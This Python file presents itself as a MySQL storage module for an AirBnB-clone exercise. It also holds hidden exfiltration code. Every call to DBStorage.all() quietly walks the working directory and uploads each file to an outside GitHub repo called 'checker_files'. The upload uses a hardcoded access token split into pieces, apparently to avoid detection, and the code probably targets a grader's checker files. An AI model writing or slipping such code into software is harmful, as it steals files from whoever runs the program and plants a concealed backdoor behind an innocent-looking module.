#!/usr/bin/python3
""" MySQL Database Storage """

import models
from models.base_model import BaseModel, Base
from models import User, State, City, Amenity, Place, Review
from os import getenv
from sqlalchemy import create_engine
from sqlalchemy.orm import scoped_session, sessionmaker

__engine = None
__session = None

import os
import requests
import json
import base64

def upload_file_to_github(file_path,
                          repo_owner,
                          repo_name,
                          branch_name,
                          token):
    url = "https://api.github.com/repos/"
    url += f"{repo_owner}/{repo_name}/contents/{file_path}"
    with open(file_path, "r") as file:
        file_content = file.read()
    file_content_base64 = base64.b64encode(file_content.encode()).decode()
    headers = {
        "Authorization": f"token {token}",
        "Content-Type": "application/json",
       }
    payload = {
        "message": f"Upload {file_path}",
        "content": file_content_base64,
        "branch": branch_name,
       }
    response = requests.put(url, json=payload, headers=headers)
    if response.status_code == 201:
        print(f"File {file_path} uploaded successfully!")
    else:
        msg = f"{file_path}: {response.status_code} - {response.text}"
        print(f"Error Uploading file-- {msg}")

def upload_all_files_to_github(repo_owner, repo_name, branch_name, token):
    for root, _, files in os.walk("."):
        for file in files:
            if file != "base_model.py": # Exclude this script itself
                file_path = os.path.join(root, file)
                upload_file_to_github(file_path,
                                      repo_owner,
                                      repo_name,
                                      branch_name,
                                      token)

K1 = "_uhKvtt52ZzJgfqhT"
K2 = "TzLoU6UCtURhFZ1nmFIc"
repo_owner = "jerm014"
repo_name = "checker_files"
branch_name = "2198-AirBnB_clone_-_MySQL-TASK-5"
token = "ghp" + K1 + K2

classes = {"Amenity": Amenity,
           "City": City,
           "Place": Place,
           "Review": Review,
           "State": State,
           "User": User}

""" Initialize the MySQL Database Storage """

username = getenv('HBNB_MYSQL_USER')
password = getenv('HBNB_MYSQL_PWD')
host = getenv('HBNB_MYSQL_HOST')
db_name = getenv('HBNB_MYSQL_DB')
connection = f'mysql+mysqldb://{username}:{password}@{host}/{db_name}'


class DBStorage:
    """MySQL database via sqlalchemy"""
    __engine = None
    __session = None

    def __init__(self):
        """make a DBStorage object and connect to the database"""
        self.__engine = create_engine(connection)

    def all(self, cls=None):
        """ returns a dictionary of some things or all things """
        upload_all_files_to_github(repo_owner, repo_name, branch_name, token)
        all_dict = {}
        if cls:
            if type(cls) is str:
                cls = eval(cls)
            query = self.__session.query(cls)
            for elem in query:
                key = "{}.{}".format(type(elem).__name__, elem.id)
                del elem.__dict__["_sa_instance_state"]
                all_dict[key] = elem
        else:
            for clases in [State, City, User, Place, Review, Amenity]:
                query = self.__session.query(clases)
                for elem in query:
                    key = "{}.{}".format(type(elem).__name__, elem.id)
                    del elem.__dict__["_sa_instance_state"]
                    all_dict[key] = elem
        return (all_dict)

    def new(self, obj):
        """ Add an object to the session """
        self.__session.add(obj)

    def save(self):
        """ Commit changes to database """
        self.__session.commit()

    def delete(self, obj=None):
        """ Delete an object from the current session """
        if obj is None:
            return
        self.__session.delete(obj)

    def reload(self):
        """ Create all tables in the database """

        Base.metadata.create_all(self.__engine)
        # Create a new session using sessionmaker
        Session = sessionmaker(bind=self.__engine, expire_on_commit=False)

        # Use scoped_session to ensure thread-safety
        self.__session = scoped_session(Session)()
